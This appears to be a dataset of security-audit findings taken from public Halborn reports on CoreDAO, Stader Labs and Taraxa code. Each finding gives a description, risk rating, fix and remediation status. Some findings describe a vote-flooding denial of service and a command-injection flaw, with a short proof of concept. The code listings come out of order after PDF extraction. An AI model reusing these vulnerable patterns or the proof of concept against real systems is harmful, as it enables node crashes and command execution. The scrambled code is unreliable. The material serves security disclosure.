{ \" value \": 1 2 3 4  MIN_INIT_DELEGATE_VALUE + 1 e19 }) 5 6 7 turn_round ([ consensus ]) pledge_agent . undelegateCoin ( operator ) 45 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider changing workflow and distribute dust to the system contract. Remediation Plan: SOLVED: The CoreDAO team solved the issue in commit d2dfe1155f by sending dust to the system reward contract. 46 ", "labels": ["Halborn", "CoreDAO_Genesis", "Severity: Medium"]}, {"title": "EXPIRED PROPOSALS ARE NOT CHECKED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "GovHub is the governance contract for CoreDAO, a contract that allows any member to submit proposals with the initiator address stored in the proposer field. In the implementation, expired proposals are not check on the state function. Expired proposals still can be executed by the governance. Code Location: /contracts/GovHub.sol#L208 Listing 16 require ( proposalCount >= proposalId && proposalId > 0, \" state : function state ( uint256 proposalId ) public view returns ( } else if ( block . number <= proposal . startBlock ) { Proposal storage proposal = proposals [ proposalId ]; if ( proposal . canceled ) { } else if ( block . number <= proposal . endBlock ) { return ProposalState . Pending ; return ProposalState . Canceled ; 1  ProposalState ) { 2  invalid proposal id \"); 3 4 5 6 7 8 9 10  proposal . forVotes <= proposal . totalVotes / 2) { 11 12 13 14 15 16 17 } else if ( proposal . executed ) { return ProposalState . Succeeded ; return ProposalState . Executed ; return ProposalState . Defeated ; return ProposalState . Active ; } else { } } } else if ( proposal . forVotes <= proposal . againstVotes || 47 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to check expired proposals on the state function. Remediation Plan: SOLVED: The CoreDAO team solved the issue in commit 82e9fad19c7 by adding the expired option in proposals. 48 3.10 (HAL-10) REQUIRE STATEMENTS ARE NOT COMPATIBLE WITH THE COMMENTS - LOW ", "labels": ["Halborn", "CoreDAO_Genesis", "Severity: Informational"]}, {"title": "LACK OF MANAGER TRANSFER FUNCTIONALITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_SD_Token_Staking_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The rewards-pool and lock contracts do not implement any functionality to change the manager address, which is set at contract instantiation. If the manager account keys are suspected to be compromised or if the development team needs to change the address for an operational reason, some functionality of the contract could be rendered unusable. It is worth mentioning that this issue has a very limited impact, as there is only one manager-only functionality that can be used once. Code Location: Listing 1: contracts/rewards-pool/src/contract.rs (Line 63) let mut config = CONFIG . load ( deps . storage ) ?; let sending_manager = info . sender . to_string () ; if sending_manager . ne (& config . manager ) { return Err ( ContractError :: Unauthorized {}) ; deps : DepsMut , info : MessageInfo , _env : Env , staking_contract : String , 54 pub fn update_configs ( 55 56 57 58 59 ) -> Result < Response , ContractError > { 60 61 62 63 64 65 66 67 68 69 70  () ) ?; } 71 72 73 config . staking_contract = deps } CONFIG . save ( deps . storage , & config ) ?; if config . staking_contract . eq (& Addr :: unchecked ( \"0 \" )) { . api . addr_validate ( staking_contract . to_lowercase () . as_str 13 74 75 76 77 78 } Ok ( Response :: new () . add_attribute ( \" method \" , \" update_configs \" ) . add_attribute ( \" staking_contract \" , staking_contract )) Listing 2: contracts/lock/src/contract.rs (Line 65) let mut config = CONFIG . load ( deps . storage ) ?; let sending_manager = info . sender ; if sending_manager . ne (& config . manager ) { return Err ( ContractError :: Unauthorized {}) ; } deps : DepsMut , info : MessageInfo , _env : Env , staking_contract : String , 57 pub fn update_configs ( 58 59 60 61 62 ) -> Result < Response , ContractError > { 63 64 65 66 67 68 69 70 71 72  () ) ?; 73 } 74 75 76 77 78 } config . staking_contract = deps CONFIG . save ( deps . storage , & config ) ?; if config . staking_contract . eq (& Addr :: unchecked ( \"0 \" )) { . api . addr_validate ( staking_contract . to_lowercase () . as_str Ok ( Response :: new () . add_attribute ( \" method \" , \" update_configs \" )) Risk Level: Likelihood - 3 Impact - 2 14 Recommendation: Manager transfer capabilities should be added to contracts as a two- step process split into a set_manager and a accept_manager functions. The latter requires the recipient to complete the transfer, effectively protecting the contract against potential typographical errors, compared to one-step manager transfer mechanisms. Remediation plan: RISK ACCEPTED: The risk for this issue was accepted by the Stader Labs team. They also mentioned that there is no use case for changing the manager in the future. 15 ", "labels": ["Halborn", "Stader_Labs_SD_Token_Staking_Contracts_CosmWasm", "Severity: Low"]}, {"title": "MISSING BOUNDS ON", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_SD_Token_Staking_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The staking contract has missing bounds on the emission_rate and unbonding_period variables. This can lead to unexpected contract behavior. The bounds of these parameters should be enforced to avoid potential errors in the current or future uses of these variables. Code Location: Listing 3: contracts/staking/src/contract.rs (Lines 44,48,64,66) set_contract_version ( deps . storage , CONTRACT_NAME , let state = State { deps : DepsMut , env : Env , _info : MessageInfo , msg : InstantiateMsg , 35 pub fn instantiate ( 36 37 38 39 40 ) -> Result < Response , ContractError > { 41  CONTRACT_VERSION ) ?; 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 }; STATE . save ( deps . storage , & state ) ?; let config = Config { manager : deps . api . addr_validate ( msg . manager . to_lowercase () . as_str () )?, xsd_cw20_contract : Addr :: unchecked ( \"0 \" ) , sd_cw20_contract : deps . api . addr_validate ( msg . sd_cw20_contract . to_lowercase () . emission_rate : msg . emission_rate , last_exchange_rate_updated_block : env . block . height , next_undelegate_id : 0, 16  as_str () )?, 58 59 60  () . as_str () )?, 61 62 63  () )?, 64 65 66 67 68 69 } rewards_pool_contract : deps . api . addr_validate ( msg . rewards_pool_contract . to_lowercase lock_contract : deps . api . addr_validate ( msg . lock_contract . to_lowercase () . as_str unbonding_period : msg . unbonding_period , }; CONFIG . save ( deps . storage , & config ) ?; Ok ( Response :: new () . add_attribute ( \" method \" , \" instantiate \" )) Listing 4: contracts/staking/src/contract.rs (Lines 369,370,373,374) deps : DepsMut , info : MessageInfo , _env : Env , update_config_request : UpdateConfigRequest , 337 pub fn update_config ( 338 339 340 341 342 ) -> Result < Response , ContractError > { 343 344 345 346 347 348 349 350 351 if sending_manager . ne (& config . manager ) { } return Err ( ContractError :: Unauthorized {}) ; let mut config = CONFIG . load ( deps . storage ) ?; let mut state = STATE . load ( deps . storage ) ?; let sending_manager = info . sender . to_string () . to_lowercase () ; if let Some ( sd_cw20 ) = update_config_request . sd_cw20_contract  { 352 config . sd_cw20_contract = deps . api . addr_validate ( sd_cw20 .  to_lowercase () . as_str () ) ?; 353 354 355 } if let Some ( xsd_cw20 ) = update_config_request .  xsd_cw20_contract { 356 357 if config . xsd_cw20_contract . eq (& Addr :: unchecked ( \" 0\" )) { config . xsd_cw20_contract = deps . api . addr_validate (  xsd_cw20 . to_lowercase () . as_str () ) ?; 358 } 17 359 360 361 362 } if let Some ( lock ) = update_config_request . lock_contract { config . lock_contract = deps . api . addr_validate ( lock .  to_lowercase () . as_str () ) ?; 363 364 365  { 366 } if let Some ( rpc ) = update_config_request . rewards_pool_contract config . rewards_pool_contract = deps . api . addr_validate ( rpc .  to_lowercase () . as_str () ) ?; 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 } } if let Some ( er ) = update_config_request . emission_rate { state . emission_rate = er ; } if let Some ( up ) = update_config_request . unbonding_period { config . unbonding_period = up ; } CONFIG . save ( deps . storage , & config ) ?; STATE . save ( deps . storage , & state ) ?; Ok ( Response :: new () . add_attribute ( \" method \" , \" update_config \" )) Risk Level: Likelihood - 4 Impact - 1 Recommendation: Upper and lower bounds for the emission_rate and unbonding_period vari- ables should be applied when they are updated during the execution of the update_config function and at instantiation. 18 Remediation plan: SOLVED: The issue was fixed with the above recommendation in commits:  2f1aa9ae1db519d452fa3456fa912a562041b666  ea46b4313fc5ce14d9b8adedb290a1a4b4b28829 19 ", "labels": ["Halborn", "Stader_Labs_SD_Token_Staking_Contracts_CosmWasm", "Severity: Low"]}, {"title": "LACK OF ADDRESS NORMALIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_SD_Token_Staking_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The set_manager function of the staking contract takes user input directly as an address without performing any validation. This could lead to failed messages or the storage of incorrect information. However, the impact in this particular case is very limited since the address submitted in the set_manager function must execute the accept_manager function to finish the process, protecting against po- tential mistakes such as those mentioned. Code Location: Listing 5: contracts/staking/src/contract.rs (Lines 93,103) let config = CONFIG . load ( deps . storage ) ?; if info . sender . ne (& config . manager ) { return Err ( ContractError :: Unauthorized {}) ; } deps : DepsMut , info : MessageInfo , _env : Env , manager : String , 89 pub fn set_manager ( 90 91 92 93 94 ) -> Result < Response , ContractError > { 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 deps . storage , & TmpManagerStore { manager : manager . clone () , TMP_MANAGER_STORE . save ( Ok ( Response :: new () ) ?; }, . add_attribute ( \" method \" , \" set_manager \" ) . add_attribute ( \" new_manager \" , manager )) 20 Risk Level: Likelihood - 1 Impact - 1 Recommendation: One of the two approaches detailed below should be used:  In addition to validation, addresses should be normalized to lower- case before being stored for future use.  Instead of just validation, addresses should be stored in canon- ical format using the cosmwasm_std::Api::addr_canonicalize utility function. The following considerations should be considered when implementing the second option:  To successfully compare a canonical address, both ends should be in canonical format. For example, when performing access controls, the sender (e.g.: info.sender or env.message.sender) should also be canonicalized beforehand.  To send funds to a canonicalized address or include it in a message to a different contract, it should be first turn into its human-readable format via the cosmwasm_std::Api::addr_humanize utility function Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit 0f3fbb9237c43f381987e113fa418d4cd1afbb57. 21 ", "labels": ["Halborn", "Stader_Labs_SD_Token_Staking_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "CONFIGURATION PARAMETER NOT SET UPON INSTANTIATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_SD_Token_Staking_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The instantiate function did not set the staking_contract address, as it did for other required contract addresses in the configuration. Instead, it relied on update_config being called post initialization. If the stacking address is not set by calling update_config before executing transfer_rewards, an attempt to transfer to address 0 will end the panic! macro and unnecessary consumption of gas fee per transaction. It is worth noting that the update_config function only allowed setting the staking address if it contained the initial value Addr::unchecked(\"0\"). This effectively forbids any future change after the first update. Code Location: Listing 6: contracts/rewards-pool/src/contract.rs (Line 25) let config = Config { deps : DepsMut , _env : Env , _info : MessageInfo , msg : InstantiateMsg , 18 pub fn instantiate ( 19 20 21 22 23 ) -> Result < Response , ContractError > { 24 25 26 27 28  as_str () )?, 29 30 31 32 }; staking_contract : Addr :: unchecked ( \" 0\" ) , sd_cw20_contract : deps . api . addr_validate ( msg . sd_cw20_contract . to_lowercase () . manager : deps . api . addr_validate ( msg . manager . to_lowercase () . as_str () )?, 22 Listing 7: contracts/lock/src/contract.rs (Line 31) deps : DepsMut , _env : Env , _info : MessageInfo , msg : InstantiateMsg , 18 pub fn instantiate ( 19 20 21 22 23 ) -> Result < Response , ContractError > { 24 25 26 27 28 29 30  as_str () )?, 31 32 33  CONTRACT_VERSION ) ?; 34 sd_cw20_contract : deps CONFIG . save ( deps . storage , & config ) ?; let config = Config { manager : deps . api . addr_validate ( msg . manager . to_lowercase () . as_str () )?, . api . addr_validate ( msg . sd_cw20_contract . to_lowercase () . staking_contract : Addr :: unchecked ( \" 0\" ) , }; set_contract_version ( deps . storage , CONTRACT_NAME , Risk Level: Likelihood - 1 Impact - 1 Recommendation: The staking_contract variable should be set on instantiate, as with the other contract addresses. Remediation plan: ACKNOWLEDGED: The Stader Labs team acknowledged this finding. 23 ", "labels": ["Halborn", "Stader_Labs_SD_Token_Staking_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "VOTES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "Uncontrolled resource consumption and out-of-memory (OOM) vulnerability was observed within taraxa-node code. This could be exploited in a Denial of Service/Distributed Denial of Service (DoS/DDoS) attack against the taraxa node via p2p messaging. The attack could be performed by a peer rapidly sending multiple un- verifiable votes, which would be handled later on via VotePacketHandler . Calling the addUnverifiedVote function would append the votes to an unverified_votes_ memory map that it would continue to grow without limit, causing the node to crash. Code Location: The main cause of the problem was within the VotePacketHandler packet, and unverified votes were stored in the classic memory map. The attacker could send a vote packet containing 1000 votes. Listing 1: s/vote_packet_handler.cpp (Line 57) /libraries/core_libs/network/src/tarcap/packets_handler- auto vote = std :: make_shared < Vote >( packet_data . rlp_ [ i ]. data () . std :: vector < std :: shared_ptr < Vote >> votes ; const auto count = packet_data . rlp_ . itemCount () ; for ( size_t i = 0; i < count ; i ++) { 23 24 void VotePacketHandler :: process ( const PacketData & packet_data ,  const std :: shared_ptr < TaraxaPeer > & peer ) { 25 26 27 28  toBytes () ); 29 30 31 32 33 34 const auto vote_round = vote -> getRound () ; const auto current_pbft_round = pbft_mgr_ -> getPbftRound () ; const auto vote_hash = vote -> getHash () ; LOG ( log_dg_ ) << \" Received PBFT vote \" << vote_hash ; 16 E D O N A X A R A T // Votes vote_round >= current_pbft_round // Synchronization point in case multiple threads are LOG ( log_dg_ ) << \" Received PBFT vote \" << vote_hash << \" ( // Synchronization point in case multiple threads are LOG ( log_dg_ ) << \" Received vote \" << vote_hash << \" ( from \" } else if ( vote_mgr_ -> addRewardVote ( vote )) { // As peers have small caches of known votes . Only mark } << \" ) already seen . \"; } continue ; if (! seen_votes_ . insert ( vote_hash )) { peer -> markVoteAsKnown ( vote_hash ); votes . push_back ( std :: move ( vote )) ; // Check reward vote if ( vote_round < current_pbft_round ) { 35 36 37  processing the same vote at the same time 38 39  << packet_data . from_node_id_ . abridged () 40 41 42  gossiping votes 43 44 45 46 47 48 49 50  processing the same vote at the same time 51 if (! seen_votes_ . insert ( vote_hash )) { 52  from \" << packet_data . from_node_id_ . abridged () 53 54 55 56 57 58  addUnverifiedVote ( vote )) { 59  from \" << packet_data . from_node_id_ . abridged () 60 61 62 63  votes . Only mark gossiping votes 64 65 66 67 68 69 } peer -> markVoteAsKnown ( vote_hash ); votes . push_back ( std :: move ( vote )) ; onNewPbftVotes ( std :: move ( votes )); << \" ) already seen .\" ; continue ; continue ; } } // Adds unverified vote into queue if ( vote_mgr_ -> voteInVerifiedMap ( vote ) || ! vote_mgr_ -> LOG ( log_dg_ ) << \" Received PBFT vote \" << vote_hash << \" ( << \" ) already saved in ( un ) verified queues . \" ; } // Do not mark it before , as peers have small caches of known 17 E D O N A X A R A T Listing 2: s/vote_packet_handler.cpp (Lines 72,66) /libraries/core_libs/network/src/tarcap/packets_handler- { LOG ( log_dg_ ) << \" Vote \" << hash << \" is in unverified map // this will cache object variables - if (! found_round -> second . insert ({ hash , vote }) . second ) { UniqueLock lock ( unverified_votes_access_ ); if ( auto found_round = unverified_votes_ . find ( pbft_round ); uint64_t pbft_round = vote -> getRound () ; const auto & hash = vote -> getHash () ; vote -> getVoterAddr () ; 58 59 bool VoteManager :: addUnverifiedVote ( std :: shared_ptr < Vote > const &  vote ) { 60 61 62  speed up 63 64 65 66  found_round != unverified_votes_ . end () ) { 67 68  already \" ; 69 70 71 72  { std :: make_pair ( hash , vote ) }; 73 74 75 76  abridged () ; 77 78 79 } 80 } LOG ( log_nf_ ) << \" Add unverified vote \" << vote -> getHash () . unverified_votes_ [ pbft_round ] = std :: move ( votes ); std :: unordered_map < vote_hash_t , std :: shared_ptr < Vote >> votes return false ; return true ; } else { } } Listing 3: /libraries/core_libs/consensus/include/vote_manager/vote_- manager.hpp (Line 336) 334 335 336 // < pbft round , < vote hash , vote >> std :: map < uint64_t , std :: unordered_map < vote_hash_t , std ::  shared_ptr < Vote >>> unverified_votes_ ; E D O N A X A R A T 18 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Use ExpirationCache to store unverified votes instead of the classic C++ map. Remediation Plan: SOLVED: The Taraxa team solved the issue by removing unverified_votes_ and refactoring the vote_manager class. ece157723262507f0209942fc573b80f5e436eb6 E D O N A X A R A T 19 ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Critical"]}, {"title": "RPC", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "The RPC Server did not implement authentication or level-based access control, which allowed anyone with network level access to create raw transactions using the send_coin_transaction call. Risk Level: Likelihood - 5 Impact - 5 Recommendation: Implement RPC Authentication and whitelisting for users, where users must have privileges to call specifics group of RPC calls. Remediation Plan: The Taraxa team SOLVED: eth_sendTransaction call and disabling the RPC by default. 1914 solved issue the by removing the 20 E D O N A X A R A T ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Critical"]}, {"title": "BLOCK QUEUE WARNING WILL BLOCK INSTEAD OF WARNING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "There was a typo in the name within the configuration file. The user could supply the max_block_queue_warn number, expecting to generate warning logs. Instead, it would block the addition of new blocks to the queue. Listing 4: libraries/core_libs/node/src/node.cpp (Line 109) dag_mgr_ = std :: make_shared < DagManager >( dag_genesis_block_hash , std :: make_shared < DagBlockManager >( node_addr , conf_ . chain . pbft_chain_ , conf_ . 17 dag_blk_mgr_ = 18  sortition , conf_ . chain . dag , db_ , trx_mgr_ , final_chain_ , 19  max_block_queue_warn , conf_ . max_levels_per_period ); 20  node_addr , trx_mgr_ , pbft_chain_ , dag_blk_mgr_ , db_ , 21  conf_ . light_node_history , conf_ . max_levels_per_period , 22 23  final_chain_ , next_votes_mgr_ ); `` ` 24 vote_mgr_ = std :: make_shared < VoteManager >( node_addr , db_ , conf_ . is_light_node , conf_ . dag_expiry_limit ); Listing 5: libraries/core_libs/consensus/src/dag/dag_block_manager.cpp (Lines 113,114) 99 DagBlockManager :: InsertAndVerifyBlockReturnType DagBlockManager ::  insertAndVerifyBlock ( DagBlock && blk ) { 100 101 if ( isDagBlockKnown ( blk . getHash () )) { LOG ( log_dg_ ) << \" Trying to push new unverified block \" << blk .  getHash () . abridged () 102 103 104 105 106 << \" that is already known , skip it \" ; return InsertAndVerifyBlockReturnType :: AlreadyKnown ; } // Mark block as seen - synchronization point in case multiple  threads are processing the same block at the same time E D O N A X A R A T 21 107 108 if (! markDagBlockAsSeen ( blk )) { LOG ( log_dg_ ) << \" Trying to push new unverified block \" << blk .  getHash () . abridged () 109 110 111 112 113 114 << \" that is already marked as known , skip it \" ; return InsertAndVerifyBlockReturnType :: AlreadyKnown ; } if ( queue_limit_ > 0) { if ( const auto queue_size = getDagBlockQueueSize () ;  queue_limit_ < queue_size ) { 115 LOG ( log_er_ ) << \" Block queue large . Verified queue : \" <<  queue_size << \" ; Limit : \" << queue_limit_ ; 116 117 118 119 120 } return InsertAndVerifyBlockReturnType :: BlockQueueOverflow ; } const auto verified = verifyBlock ( blk ); if ( verified == InsertAndVerifyBlockReturnType ::  InsertedAndVerified ) { Risk Level: Likelihood - 1 Impact - 1 Recommendation: Rename max_block_queue_warn to max_block_queue. Remediation Plan: SOLVED: The Taraxa team solved the issue within the new dag block refac- toring pull request. 1884 22 E D O N A X A R A T TARAXA EVM 23 ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Informational"]}, {"title": "UNFILTERED PARAMETER ALLOWED TO EXECUTE COMMANDS ON THE HOST", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "The SolidityVersion function located in common/compiler/solidity.go was detected to be vulnerable to uncontrolled command execution. The input parameter used by the function was not correctly sanitized, allowing an attacker to abuse the functionality and execute commands in the underlying Operating System. Code Location:  Taraxa-evm/common/compiler/solidity.go Listing 6: Taraxa-evm/common/compiler/solidity.go (Lines 89-92,94,96) solc = \" solc \" if solc == \"\" { 88 // SolidityVersion runs solc and parses its version output . 89 func SolidityVersion ( solc string ) (* Solidity , error ) { 90 91 92 93 94 95 96 97 98 99 100 101 102 } var out bytes . Buffer cmd := exec . Command ( solc , \" -- version \") cmd . Stdout = & out err := cmd . Run () if err != nil { } matches := versionRegexp . FindStringSubmatch ( out . String () ) if len ( matches ) != 4 { return nil , err return nil , fmt . Errorf ( \" can 't parse solc version %q \" , out .  String () ) 103 104 } s := & Solidity { Path : cmd . Path , FullVersion : out . String () ,  Version : matches [0]} 105 106 if s . Major , err = strconv . Atoi ( matches [1]) ; err != nil { return nil , err 24 M V E A X A R A T 107 108 109 110 111 112 113 114 115 } } if s . Minor , err = strconv . Atoi ( matches [2]) ; err != nil { return nil , err } if s . Patch , err = strconv . Atoi ( matches [3]) ; err != nil { return nil , err } return s , nil Proof of Concept: Listing 7: PoC.go (Line 11) 1 2 package main 3 4 import ( 5 6 7 ) 8 9 func main () { 10 11 12 } \" os \" \" github . com / Taraxa - project / taraxa - evm / common / compiler \" // Call to the SolidityVersion function compiler . SolidityVersion ( os . Args [1]) M V E A X A R A T 25 Figure 1: Command execution invoking curl command as an example. Risk Level: Likelihood - 3 Impact - 3 Recommendation: Avoid using the os/exec library whenever possible. This would allow an attacker to interact and execute commands on the underlying Operating However, filtering the input System when it is not used correctly. parameters would make the implementation of the function more secure. Remediation Plan: SOLVED: The Taraxa team solved the issue by removing the solidity.go file. 5abe0c4dbcc94d5ee1b991fa9efcf15af16502a1 26 M V E A X A R A T ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Medium"]}, {"title": "LACK OF RETURN ERROR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "No return statements were found in the function that would return an error, due to the lack of a default statement in the Switch clause. In case another method makes use of this function, the error would never be caught, triggering undefined behavior in the EVM and consequently in the Node. Code Location:  Taraxa-evm/accounts/abi/abi.go Listing 8: Taraxa-evm/accounts/abi/abi.go (Lines 110,93,132) } var fields [] struct { [] Argument [] Argument string Type string Name Constant bool Anonymous bool Inputs Outputs 92 // UnmarshalJSON implements json . Unmarshaler interface 93 func ( abi * ABI ) UnmarshalJSON ( data [] byte ) error { 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 abi . Methods = make ( map [ string ] Method ) abi . Events = make ( map [ string ] Event ) for _ , field := range fields { abi . Constructor = Method { Inputs : field . Inputs , switch field . Type { case \" constructor \" : return err } } if err := json . Unmarshal ( data , & fields ); err != nil { 27 M V E A X A R A T 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 // empty defaults to function according to the abi spec case \" function \" , \" \": abi . Methods [ field . Name ] = Method { Name : Const : Inputs : Outputs : field . Outputs , field . Name , field . Constant , field . Inputs , } case \" event \" : abi . Events [ field . Name ] = Event { field . Name , Name : Anonymous : field . Anonymous , Inputs : field . Inputs , } } } return nil Risk Level: Likelihood - 3 Impact - 3 Recommendation: Include a Default statement that could be triggered on error, and update the return value accordingly. Remediation Plan: The Taraxa team default SOLVED: clause with an error message, which would be triggered in case the switch statement could not satisfy any of the offered options. 95f111ec8f9812f2174db0abd97af98c95e5ea77 solved adding issue the by a 28 M V E A X A R A T ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Medium"]}, {"title": "LACK OF SIZE CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "The affected functions did not check the size of the array before performing the access. The function could trigger an Out-of-Bounds state and consequent Panic when trying to access a non-existent position. Code Location:  Taraxa-evm/taraxa/util/bin/index.go:ENC_b_endian_compact_64  Taraxa-evm/taraxa/util/bin/index.go:DEC_b_endian_compact_64  Taraxa-evm/taraxa/util/bin/index.go:ENC_b_endian_64  Taraxa-evm/taraxa/util/bin/index.go:DEC_b_endian_64 Listing 9: Taraxa-evm/taraxa/util/bin/index.go (Lines 65-66) return uint64 ( b [0]) < <56 | uint64 ( b [1]) < <48 | uint64 ( b [2]) < <40 uint64 ( b [4]) < <24 | uint64 ( b [5]) < <16 | uint64 ( b [6]) < <8 | 64 func DEC_b_endian_64 (b [] byte ) uint64 { 65  | uint64 ( b [3]) < <32 | 66  uint64 (b [7]) 67 } M V E A X A R A T 29 Proof of Concept: Figure 2: Out-of-Bound error triggered by go-fuzz fuzzer. Risk Level: Likelihood - 3 Impact - 3 Recommendation: As Check the size of the array before performing bitwise operations. a general rule, the size of the array should be checked before any operation, so as not to trigger unhandled exceptions. Remediation Plan: The Taraxa team default SOLVED: clause with an error message, which would be triggered in case the switch statement could not satisfy any of the offered options. 85b89e5aed7f31f64cabe6e0dbd1bc8f1a1fc904 solved adding issue the by a M V E A X A R A T 30 ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Medium"]}, {"title": "INCORRECT NIL VALUE RETURNED ON AN ERROR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "The exposed function did not return a correct error value when an error was triggered within the function. This could lead to unexpected behaviors in other functions that make use of the errors returned by Run(). Returning a nil value in the error variable would not propagate the error. Code Location: Listing 10: Taraxa-evm/core/vm/contracts.go (Lines 115,117-118,122) 99 func ( c ecrecover ) Run ( ctx CallFrame , evm * EVM ) ([] byte , error ) { 100 101 102 103 104 105 106 107 108 109 110 111 const ecRecoverInputLength = 128 input := ctx . Input input = common . RightPadBytes ( input , ecRecoverInputLength ) // \" input \" is ( hash , v , r , s ) , each 32 bytes // but for ecrecover we want (r , s , v) r := new ( big . Int ). SetBytes ( input [64:96]) s := new ( big . Int ). SetBytes ( input [96:128]) v := input [63] - 27 // tighter sig s values input homestead only apply to tx sigs if ! allZero ( input [32:63]) || ! crypto . ValidateSignatureValues (v  , r , s , false ) { 112 113 114 115 return nil , nil } // v needs to be at the end for libsecp256k1 pubKey , err := crypto . Ecrecover ( input [:32] , append ( input  [64:128] , v )) 116 117 118 119 120 121 // make sure the public key is a valid one if err != nil { return nil , nil } // the first byte of pubkey is bitcoin heritage 31 M V E A X A R A T 122 return common . LeftPadBytes ( keccak256 . Hash ( pubKey [1:]) [12:] ,  32) , nil 123 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: When an error value is returned within the function, it must be sent to the rest of the affected functions to handle this unexpected behavior. Remediation Plan: SOLVED: The Taraxa team solved the issue by adding an error message to the return value. 41cd2d7fdf855627f1b08209b6c804bf1bdd3f54 M V E A X A R A T 32 ", "labels": ["Halborn", "Taraxa_Node_EVM_L1", "Severity: Medium"]}, {"title": "MULTIPLE OUTDATED MODULES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf", "body": "As part of the security audit process, an automated verification of project dependencies was performed. As a result, multiple vulnerable or outdated modules were found, but the affected dependencies were not exploited by auditors. However, this could be exploited if an attacker gains enough privileges or reach certain conditions. Results: Module /aead/siphash /btcsuite/btcd /btcsuite/btclog /btcsuite/btcutil /btcsuite/go-socks /btcsuite/goleveldb /btcsuite/snappy-go /btcsuite/websocket /btcsuite/winsvc /davecgh/go-spew /emicklei/dot /fjl/gencodec /fsnotify/fsnotify /garslo/gogen /golang/protobuf /hpcloud/tail /jessevdk/go-flags /jrick/logrotate /k0kubun/go-ansi /kkdai/bstream Version v1.0.1 v0.20.1-beta v0.0.0-20170628155309 v0.0.0-20190425235716 v0.0.0-20170105172521 v0.0.0-20160330041536 v0.0.0-20151229074030 v0.0.0-20150119174127 v1.0.0 v1.1.1 v0.10.2 v0.0.0-20191126094850 v1.4.7 v0.0.0-20170306192744 v1.2.0 v1.0.0 v0.0.0-20141203071132 v1.0.0 v0.0.0-20180517002512 v0.0.0-20161212061736 Patched version v0.23.1 v1.0.2 v1.0.0 v1.0.0 v1.0.0 v0.0.0-20220412091415 v1.5.4 v0.0.0-20170307003452 v1.5.2 v1.5.0 v1.0.0 33 M V E A X A R A T Module /kr/pty /kr/text /kylelemons/godebug /mattn/go-isatty /mattn/go-runewidth /mitchellh/colorstring /niemeyer/pretty /onsi/ginkgo /onsi/gomega /otiai10/copy /otiai10/curr /otiai10/mint /pmezard/go-difflib /schollz/progressbar/v3 /stretchr/objx /stretchr/testify /tecbot/gorocksdb /x/crypto /x/net /x/sync /x/sys /x/text /x/tools /x/xerrors /check.v1 /fsnotify.v1 /tomb.v1 /yaml.v2 /yaml.v3 Version v1.1.1 v0.1.0 v0.0.0-20170224010052 v0.0.12 v0.0.9 v0.0.0-20190213212951 v0.0.0-20200227124842 v1.10.3 v1.7.1 v1.2.0 v1.0.0 v1.3.1 v1.0.0 v3.3.3 v0.1.0 v1.6.1 v0.0.0-20191217155057 v0.0.0-20200221231518 v0.0.0-20190620200207 v0.0.0-20190423024810 v0.0.0-20200223170610 v0.3.0 v0.0.0-20191126055441 v0.0.0-20190717185122 v1.0.0-20200227125254 v1.4.7 v1.0.0-20141024135613 v2.2.8 v3.0.0-20200313102051 Patched version v1.1.8 v0.2.0 v1.1.0 v0.0.14 v0.0.13 v1.16.5 v1.20.0 v1.7.0 v1.3.3 v3.9.0 v0.4.0 v1.8.0 v0.0.0-20220722155217 v0.0.0-20220728211354 v0.0.0-20220722155255 v0.0.0-20220731174439 v0.3.7 v0.1.12 